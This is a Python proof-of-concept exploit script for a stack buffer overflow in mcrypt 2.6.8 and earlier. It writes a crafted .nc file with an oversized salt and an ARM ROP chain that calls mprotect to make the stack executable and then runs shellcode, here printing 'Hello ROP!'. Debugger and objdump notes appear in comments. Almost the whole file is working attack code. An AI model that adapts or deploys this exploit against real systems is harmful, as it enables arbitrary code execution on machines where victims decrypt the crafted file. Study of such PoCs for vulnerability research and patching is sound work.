#!/usr/bin/env python

# mcrypt version <= 2.6.8 stack BOF poc
# The overflow happens in check_file_head() while it decrypts a .nc files with too long salt data

#objdump -d /usr/lib32/libmcrypt.so.4.4.8 >ld.28.txt
#    3890:	e8bd43f0 	pop	{r4, r5, r6, r7, r8, r9, lr}
#    3894:	e12fff13 	bx	r3
# >>> hex(0x3890+0xf7eef000  
# '0xf7ef2890'

#pi@raspberrypi:~/Desktop/hpconarm/exploits/mcrypt-2.6.8/src $ python ../../Mcrypt_268_check_file_head/mprotect.py
#pi@raspberrypi:~/Desktop/hpconarm/exploits/mcrypt-2.6.8/src $ gdb --args ./mcrypt -d cyberpunkmp.nc


import sys
from struct import pack

# int mprotect(void *addr, size_t len, int prot);
# define PROT_READ       0x1
# define PROT_WRITE      0x2
# define PROT_EXEC       0x4
#
#(gdb) print &mprotect
#$1 = (<text variable, no debug info> *) 0x76e84db0 <mprotect>
#(gdb) print &read    
#$2 = (ssize_t (*)(int, void *, size_t)) 0x76e76858 <__GI___libc_read>
#
#(gdb) info proc mapping
# 	0x7efdf000 0x7f000000    0x21000        0x0 [stack]


# File header
file_content = "\x00\x6d\x03\x40\x73\x65\x72\x70\x65\x6e\x74\x00\x20\x00\x63\x62"
file_content += "\x63\x00\x6d\x63\x72\x79\x70\x74\x2d\x73\x68\x61\x31\x00"
file_content += chr(241) # Salt size

for i in range(0, 0x1F):
  file_content += pack('I', 0xAABBCC00 + i) # Padding



mprotect = 0xf7e74db0 # <mprotect> # 0xf7e93f60
# read = 0x76e76858 # <read> #0x76e76858
payload = "\x08\x00\x8f\xe2\x00\x30\x9f\xe5\x33\xff\x2f\xe1\x30\xf5\xdf\xf7"
# add r0, pc, 8
# ldr r3, =0xf7dff530 ; 0xf7da1000+0x5e530 (puts)    0xf7da1000: sarting address for      
# blx r3
payload += "Hello ROP!\n\0"

file_content += pack('I', 0x04409128) #0x00019080 : pop {r4, r5, r6, r7, r8, sb, pc}
file_content += 'AAAA'*2 # r4, r5 = padding
file_content += pack('I', 0x4421000) # fill register r6 with begin of heap for subsequent memmove(), since mcrypct expects at this address on the stack to be a valid pointer (probabaly a spilled variable) 
file_content += pack('I', 0xfffcf000) # r7 -> r0 = void *addr 
file_content += pack('I', 0x21000) # r8 -> r1 = size_t len
file_content += pack('I', 0x7) # sb -> r2 = int prot
file_content += pack('I', 0x0440d17c) # pc = 0x00011a60 : pop {r3, pc}
file_content += pack('I', 0x0440d17c) # r3 = 0x00011a60 : pop {r3, pc}
file_content += pack('I', 0x0440d150) # pc = 0x0001d0a8 : mov r2, sb ; mov r1, r8 ; mov r0, r7 ; blx r3
file_content += pack('I', mprotect) # r3 = mprotect
file_content += pack('I', 0xf7ef2890) # pc = 0xf7ef9890 : pop {r4, r5, r6, r7, r8, r9, lr} ; bx r3
file_content += 'AAAA'*6 # r4, r5, r6, r7, r8, r9 = padding
file_content += pack('I', 0xfffeeb90) # lr = sp
file_content += payload

# rop_chain += pack('I', read)
# rop_chain += pack('I', 0x7efdf000) # return stack
# rop_chain += pack('I',0x00) # arg int fd
# rop_chain += pack('I',0x7efdf000) # arg void
# rop_chain += pack('I',0x200) # arg size_t


try:
  count0 = open("cyberpunkmp.nc", "wb")
  count0.write(file_content)
  count0.close()
except IOError:
  print "file error"
  sys.exit(1)

print "gdb --args src/mcrypt -d cyberpunkmp.nc"
